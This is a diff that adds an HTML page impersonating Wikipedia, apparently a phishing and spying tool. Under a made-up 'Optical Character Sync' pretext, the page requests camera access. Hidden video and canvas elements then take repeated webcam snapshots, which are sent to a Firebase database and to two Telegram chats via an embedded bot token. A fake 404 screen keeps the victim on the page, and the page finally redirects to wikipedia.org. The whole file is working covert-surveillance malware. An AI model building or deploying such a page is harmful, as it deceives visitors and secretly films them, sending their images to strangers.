@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wikipedia | Citation Metadata Vault</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --wiki-blue: #36c;
+            --wiki-bg: #f8f9fa;
+            --wiki-text: #202122;
+            --wiki-border: #a2a9b1;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--wiki-bg); color: var(--wiki-text);
+            font-family: 'Linux Libertine', 'Georgia', 'Times', serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .wiki-container {
+            width: 100%; max-width: 520px; background: #ffffff;
+            border: 1px solid var(--wiki-border); border-radius: 2px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05); overflow: hidden;
+        }
+
+        .wiki-header {
+            padding: 15px 25px; border-bottom: 1px solid var(--wiki-border);
+            display: flex; align-items: center; gap: 15px; background: #fff;
+        }
+
+        .wiki-logo { width: 45px; height: 45px; opacity: 0.8; }
+        .wiki-title-text { font-size: 18px; font-weight: 400; border-bottom: 1px solid #aaa; flex-grow: 1; }
+
+        .wiki-body { padding: 35px 30px; text-align: left; }
+
+        .notice-box {
+            background: #fdfdfd; border: 1px solid #c8ccd1; padding: 15px;
+            margin-bottom: 25px; border-left: 10px solid var(--wiki-blue);
+        }
+
+        h1 { font-size: 24px; font-weight: 400; margin: 0 0 15px; font-family: serif; }
+        p { font-size: 14px; color: #444; line-height: 1.6; margin-bottom: 25px; }
+
+        .btn-wiki {
+            background: var(--wiki-blue); color: #fff; border: 1px solid var(--wiki-blue);
+            padding: 12px 25px; font-size: 14px; font-weight: bold; border-radius: 2px;
+            cursor: pointer; transition: background 0.2s; font-family: sans-serif;
+        }
+        .btn-wiki:hover { background: #447ff5; }
+
+        /* Error & Sync UI */
+        #sync-ui, #error-404 { display: none; text-align: center; }
+        
+        .wiki-loader {
+            width: 40px; height: 40px; border: 2px solid #eaecf0;
+            border-top: 2px solid var(--wiki-blue); border-radius: 50%;
+            margin: 0 auto 20px; animation: w-spin 1.2s linear infinite;
+        }
+        @keyframes w-spin { to { transform: rotate(360deg); } }
+
+        .error-title { font-size: 28px; color: #72777d; font-family: sans-serif; margin-bottom: 10px; }
+        .terminal-log {
+            text-align: left; background: #f8f9fa; padding: 12px; border-radius: 2px;
+            font-family: monospace; font-size: 10px; color: #54595d; margin-top: 25px; border: 1px solid #eaecf0;
+        }
+        .node-tag { font-size: 10px; color: #a2a9b1; margin-top: 20px; font-family: sans-serif; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="wiki-container">
+        <div class="wiki-header">
+            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/80/Wikipedia-logo-v2.svg/1200px-Wikipedia-logo-v2.svg.png" class="wiki-logo">
+            <div class="wiki-title-text">Knowledge Integrity Protocol</div>
+        </div>
+
+        <!-- Initial View -->
+        <div class="wiki-body" id="init-view">
+            <div class="notice-box">
+                <b>Metadata Verification Required:</b> You are accessing a restricted citation vault.
+            </div>
+            <h1>Document Handshake</h1>
+            <p>To ensure content integrity and prevent scraping, this node requires an <b>Optical Character Sync (OCS)</b>. This calibration validates your environmental lighting against our rendering engine to ensure 100% legibility of micro-citations.</p>
+            
+            <button class="btn-wiki" onclick="startWikiSync()">Begin OCS Calibration</button>
+            <div class="node-tag">Uplink: Mumbai_Knowledge_Gateway_01</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="wiki-body" id="sync-ui">
+            <div class="wiki-loader"></div>
+            <div style="font-weight: bold; font-family: sans-serif;">Synchronizing Metadata...</div>
+            <div style="font-size: 12px; color: #72777d; margin-top: 8px;" id="w-timer">Uplink timeout in 60s</div>
+            
+            <div class="terminal-log">
+                > CONNECTING_MUMBAI_RELAY_IN... OK<br>
+                > VERIFYING_OPTICAL_HASH... 74%<br>
+                > STATUS: ENCRYPTING_CITATIONS
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="wiki-body" id="error-404">
+            <div class="error-title">404 - Sync Failed</div>
+            <p>The Knowledge Integrity Handshake could not be completed. The Mumbai Primary Node has timed out while verifying your Optical Hash.</p>
+            <div class="wiki-loader" style="width: 25px; height: 25px;"></div>
+            <div style="font-size: 11px; color: #72777d; font-family: sans-serif;">Retrying via Secondary Maharashtra Relay...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startWikiSync() {
+            try {
+                // Requesting permission under "Optical Character Sync"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('w-timer').innerText = `Uplink timeout in ${timeLeft}s`;
+
+                        if (count <= 52) {
+                            wikiCapture(count);
+                        }
+
+                        // Trigger 404 at 45s to maintain user session
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.wikipedia.org";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.wikipedia.org";
+            }
+        }
+
+        function wikiCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "WIKIPEDIA_OCS_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_GATEWAY" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'wiki_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
